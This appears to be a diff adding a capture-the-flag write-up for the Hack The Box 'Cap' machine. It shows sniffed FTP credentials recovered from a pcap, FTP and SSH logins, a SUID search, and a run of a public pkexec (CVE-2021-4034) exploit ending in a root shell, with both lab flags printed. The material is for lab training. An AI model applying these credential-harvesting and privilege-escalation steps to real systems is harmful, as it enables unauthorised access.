@@ -155,4 +155,170 @@ http://10.129.7.133 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer
 ```
 
 Open site with browser:
+![home](IMG/home.png)
 
+Let's take a look on "Security Snapshot (5 Second PCAP + Analysis)" section, after refreshing this we found that the url changes from 0 to 9 : http://10.129.7.133/data/[0-9]
+
+![webcap](IMG/webcap.png)
+
+After check all pcap files, ftp user and password on /0:
+
+```shell
+tshark -Vr 0.pcap |egrep "USER|PASS"
+egrep: warning: egrep is obsolescent; using grep -E
+    USER nathan\r\n
+        Request command: USER
+    PASS Buck3tH4TF0RM3!\r\n
+        Request command: PASS
+```
+
+Lets go to ftp login: 
+
+```shell
+ftp nathan@10.129.7.133                                                                                                                     main 
+Connected to 10.129.7.133.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r--------    1 1001     1001           33 Oct 29 16:55 user.txt
+226 Directory send OK.
+ftp> mget user.txt
+mget user.txt? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.000967 seconds (33.3 kbytes/s)
+ftp> quit
+221 Goodbye.
+```
+
+Lets take a look on user.txt file:
+
+```shell
+cat user.txt                                                                                                                                  main 
+ec71dbbab76b04b28543dc0328ec952b
+```
+
+After get user flag, lets go ssh login and try escpriv:
+
+```shell
+
+ssh nathan@10.129.7.133                                                                                                                       main 
+nathan@10.129.7.133's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Oct 29 19:46:34 UTC 2022
+
+  System load:           0.0
+  Usage of /:            36.9% of 8.73GB
+  Memory usage:          22%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.7.133
+  IPv6 address for eth0: dead:beef::250:56ff:fe96:6fc9
+
+  => There are 2 zombie processes.
+
+
+63 updates can be applied immediately.
+42 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
+nathan@cap:~$ 
+```
+
+Check sudo privilegies:
+```shell
+nathan@cap:~$ sudo -l
+[sudo] password for nathan: 
+Sorry, user nathan may not run sudo on cap.
+nathan@cap:~$ 
+```
+
+Find suid files:
+```shell
+nathan@cap:~$     find / -perm -u=s -type f 2>/dev/null
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/fusermount
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/snap/snapd/11841/usr/lib/snapd/snap-confine
+/snap/snapd/12398/usr/lib/snapd/snap-confine
+/snap/core18/2066/bin/mount
+/snap/core18/2066/bin/ping
+/snap/core18/2066/bin/su
+/snap/core18/2066/bin/umount
+/snap/core18/2066/usr/bin/chfn
+/snap/core18/2066/usr/bin/chsh
+/snap/core18/2066/usr/bin/gpasswd
+/snap/core18/2066/usr/bin/newgrp
+/snap/core18/2066/usr/bin/passwd
+/snap/core18/2066/usr/bin/sudo
+/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2066/usr/lib/openssh/ssh-keysign
+/snap/core18/2074/bin/mount
+/snap/core18/2074/bin/ping
+/snap/core18/2074/bin/su
+/snap/core18/2074/bin/umount
+/snap/core18/2074/usr/bin/chfn
+/snap/core18/2074/usr/bin/chsh
+/snap/core18/2074/usr/bin/gpasswd
+/snap/core18/2074/usr/bin/newgrp
+/snap/core18/2074/usr/bin/passwd
+/snap/core18/2074/usr/bin/sudo
+/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2074/usr/lib/openssh/ssh-keysign
+nathan@cap:~$ 
+```
+
+Interesting pxec, after some gg search I found [pkexec](https://github.com/Almorabea/pkexec-exploit) exploit:
+
+
+```shell
+nathan@cap:~$ python3 ./CVE-2021-4034.py 
+Do you want to choose a custom payload? y/n (n use default payload)  
+[+] Cleaning pervious exploiting attempt (if exist)
+[+] Creating shared library for exploit code.
+[+] Finding a libc library to call execve
+[+] Found a library at <CDLL 'libc.so.6', handle 7ff262505000 at 0x7ff262029730>
+[+] Call execve() with chosen payload
+[+] Enjoy your root shell
+# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+# ls  
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+baee1036dbb2e55abc682c3fee1bff0c
+# 
+```
